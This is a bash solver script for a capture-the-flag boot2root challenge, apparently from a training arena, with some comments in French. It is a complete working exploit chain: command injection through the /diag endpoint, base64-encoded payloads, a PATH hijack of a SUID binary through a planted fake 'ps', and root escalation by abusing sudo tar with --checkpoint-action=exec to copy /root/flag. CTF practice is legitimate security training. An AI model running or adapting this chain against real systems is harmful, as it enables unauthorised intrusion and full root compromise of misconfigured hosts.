#!/usr/bin/env bash
# Automated end-to-end solver for boot2root-linux.
#
# Drives the whole privesc chain purely through the HTTP command-injection at
# /diag (no interactive shell, no outbound connection needed):
#
#   HTTP injection (www)  ->  SUID logsync PATH hijack (app)
#                         ->  sudo tar --checkpoint-action=exec (root)
#                         ->  copy /root/flag to a www-readable path  ->  read it
#
# Usage: ./solve.sh http://HOST:PORT
set -euo pipefail

BASE="${1:?usage: solve.sh http://HOST:PORT}"
BASE="${BASE%/}"

# --- app-side payload: runs AS app (real uid app) via the hijacked `ps`. -----
# Uses the sudo NOPASSWD tar wildcard + GTFOBins --checkpoint-action=exec to run
# a root command that copies the root-only flag somewhere www can read it.
read -r -d '' APP_PS <<'EOF' || true
#!/bin/sh
cd /home/app 2>/dev/null || cd /tmp
sudo -n /usr/bin/tar -czf /var/backups/app-logs.tgz /etc/hostname \
  --checkpoint=1 \
  --checkpoint-action=exec='cp /root/flag /tmp/.logsync/loot; chmod 644 /tmp/.logsync/loot' \
  >/dev/null 2>&1
EOF

# --- www-side payload: plant the hijack `ps`, trigger logsync, read the loot. -
APP_PS_B64="$(printf '%s' "$APP_PS" | base64 | tr -d '\n')"
read -r -d '' WWW <<EOF || true
# /dev/shm est monte noexec dans l'arene ; on plante la charge dans /tmp (exec).
mkdir -p /tmp/.logsync && chmod 755 /tmp/.logsync
rm -f /tmp/.logsync/loot
echo $APP_PS_B64 | base64 -d > /tmp/.logsync/ps
chmod 755 /tmp/.logsync/ps
PATH=/tmp/.logsync:\$PATH /usr/local/bin/logsync >/dev/null 2>&1
EOF

WWW_B64="$(printf '%s' "$WWW" | base64 | tr -d '\n')"

# Inject: "getent hosts x; <www payload>". La chaîne (logsync -> sudo tar
# checkpoint) est DÉTACHÉE (`... | sh &`) : /diag a un timeout de requête, et si
# la chaîne tourne dans la requête elle se fait tuer avant d'écrire le loot. En
# la détachant, /diag répond tout de suite et la chaîne se termine en fond.
INJECT="localhost; ( echo ${WWW_B64} | base64 -d | /bin/sh ) >/dev/null 2>&1 </dev/null &"

echo "[*] firing chain through /diag (detached) ..." >&2
curl -s -m 15 -G "$BASE/diag" --data-urlencode "target=${INJECT}" >/dev/null || true

# La chaîne s'exécute en fond ; on relit le loot plusieurs fois le temps que
# tar->checkpoint->cp aboutisse (démarrage à froid du conteneur inclus).
echo "[*] reading /tmp/.logsync/loot ..." >&2
FLAG=""
for i in 1 2 3 4 5 6; do
    sleep 2
    OUT="$(curl -s -m 15 -G "$BASE/diag" --data-urlencode 'target=localhost; cat /tmp/.logsync/loot 2>/dev/null' || true)"
    FLAG="$(printf '%s' "$OUT" | grep -oE 'NCTF\{[^}]*\}' | head -n1 || true)"
    [ -n "$FLAG" ] && break
done
if [ -n "$FLAG" ]; then
    echo "[+] flag: $FLAG"
else
    echo "[-] no flag recovered; raw /diag response:" >&2
    printf '%s\n' "$OUT" >&2
    exit 1
fi
